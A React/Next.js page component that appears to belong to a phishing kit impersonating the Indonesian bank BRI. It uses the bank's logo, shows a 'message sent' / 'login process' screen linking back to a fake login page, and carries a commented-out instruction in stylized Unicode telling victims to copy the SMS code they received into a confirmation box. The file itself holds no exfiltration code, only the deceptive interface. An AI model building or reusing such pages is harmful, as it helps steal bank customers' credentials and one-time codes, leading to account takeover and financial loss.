
import React from 'react'
import SiteImage from '../components/SiteImage'

import Link from 'next/link'

import logo from "../public/bri.jpeg"

function VerifikasiBerhasil() {
  return (
    <div className="container">
      <h2 className='msg'>Pesan Terkirim</h2>
      <div className='container-flex'>
      <div style={{display:'flex', flexDirection:'column', justifyContent:'center', maxWidth:'30em'}}>  
      <SiteImage logo={logo}/>   
          {/* <p style={{wordWrap:'break-word', fontSize:'1rem', marginLeft:12}}>𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑪𝒐𝒑𝒚/𝑺𝒂𝒍𝒊𝒏 𝑺𝑴𝑺 𝒀𝒂𝒏𝒈 𝑨𝒏𝒅𝒂 𝑻𝒆𝒓𝒊𝒎𝒂 𝑰𝒂𝒍𝒖 𝒅𝒊 𝑷𝒂𝒔𝒕𝒆/𝑻𝒆𝒎𝒑𝒆𝒍 𝒅𝒊 𝑲𝒐𝒍𝒐𝒎 𝑲𝒐𝒏𝒇𝒊𝒓𝒎𝒂𝒔𝒊 𝒀𝒂𝒏𝒈 𝒂𝒅𝒂 𝒅𝒊 𝑩𝒂𝒘𝒂𝒉 𝒊𝒏𝒊</p> */}
        </div>   
        <div style={{display:'flex', flexDirection:'column', justifyContent:'center', marginLeft:12}}>  
          <h3 className='msg'>Pesan Terkirim (
            <Link href="/login">
                <a style={{color:'#0693e3'}}>kembali</a>
              </Link>
            )
          </h3>
          <p style={{fontSize:'1rem'}}>Login proses</p>
        </div> 
      </div>
    </div>
  )
}

export default VerifikasiBerhasil